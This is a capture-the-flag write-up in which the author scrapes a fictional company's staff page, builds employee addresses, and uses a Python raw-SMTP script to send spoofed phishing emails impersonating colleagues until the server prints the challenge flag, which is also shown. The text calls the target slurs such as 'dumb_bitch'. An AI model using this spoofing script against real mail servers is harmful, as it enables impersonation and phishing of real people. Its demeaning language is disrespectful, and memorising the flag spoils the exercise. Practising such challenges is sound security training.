## Red Phish Blue Phish

This challenge switches things up by creating an interactive server and website. We are given some information in the description.

"You are to conduct a phishing exercise against our client, **Pyrch Data**.
We've identified the Marketing Director, **Sarah Williams** (swilliams@pyrchdata.com), as a user susceptible to phishing."

Sounds like this user will just click anything. Probably a bot "clicking" whatever you send it given the nature of the challenge. We are also given a smtp server address to play with after starting it up.
`nc challenge.ctf.games PORT`

So we have some good info. 
1) Emails are first_initial_lastname@pyrchdata.com
2) Pyrchdata might have a website since this server is online.
3) We are supposed to send this **idiot** a phishing email

With that in mind lets try to get some more info on the situation over at PyrchData.com

Visiting with a browser, we quickly find https://pyrchdata.com/team, useful for enumerating users as we already have a good idea of email address formatting. Sure enough lots of dorks in there.

So. Lets use this page and scrape it for use in multiple attempts to phish from one of these dweebs. Inspecting the webpage, we see that user names are all in h3 tags, but also the profile pictures. Can parse from either but lets scrape it and then send emails over the smtp address accordingly (knockknock, whoisit, whositfor, pwnchline). Just kidding its HELO -> MAIL FROM -> RCPT TO -> DATA (which is how you initiate and send your message).

Using the scraped emails (excluding Sarah) we communicate with the server like so, which stops after receiving 'flag{' in the response. Using python we can utilize `beautifulsoup` and `requests` for webscraping.

```python
import socket
import requests
from bs4 import BeautifulSoup

server = "challenge.ctf.games"
port = PORT  # CHANGE TO WHAT YOURS SAYS
dumb_bitch = "swilliams@pyrchdata.com"

message = """
Subject: Stupid Test

Hey Sarah,

Did you just blow in from stupid town?
http://literallymalware.gov

You silly goose,
Elon M
"""

def get_names():
    url = "https://pyrchdata.com/team"
    response = requests.get(url)
    if response.status_code == 200:
        return [tag.get_text().strip() for tag in BeautifulSoup(response.content, "html.parser").find_all("h3")]
    return []

def generate_email(name):
    names = name.split()
    return f"{names[0][0].lower()}{names[1].lower()}@pyrchdata.com" if len(names) >= 2 else None

def phish(sender, recipient, message):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        try:
            sock.connect((server, port))
            for cmd in [f"HELO pyrchdata.com", f"MAIL FROM:<{sender}>", f"RCPT TO:<{recipient}>", "DATA", f"{message}\r\n."]:
                sock.sendall(f"{cmd}\r\n".encode())
                response = sock.recv(4096).decode()
                print(f"Server Response: {response}")
                if "flag{" in response:
                    return True
            sock.sendall(b"QUIT\r\n")
        except Exception as e:
            print(f"Error: {e}")
    return False

names = get_names()
for name in names:
    sender = generate_email(name)
    if sender and sender != dumb_bitch:
        print(f"Trying email: {sender}")
        if phish(sender, dumb_bitch, message):
            break
```

This will print out the attempts until finding anything returning "flag{", which eventually gets to user jdaveren@pyrchdata.com.
```sh
Trying email: jdaveren@pyrchdata.com
Server Response: 220 red-phish-blue-phish-82d4f92483bf2c4d-5cdd5cd956-vs7vp Python SMTP 1.4.6
250 red-phish-blue-phish-82d4f92483bf2c4d-5cdd5cd956-vs7vp

Server Response: 250 OK

Server Response: 250 OK

Server Response: 354 End data with <CR><LF>.<CR><LF>

Server Response: 250 OK. flag{54c6ec05ca19565754351b7fcf9c03b2}
```
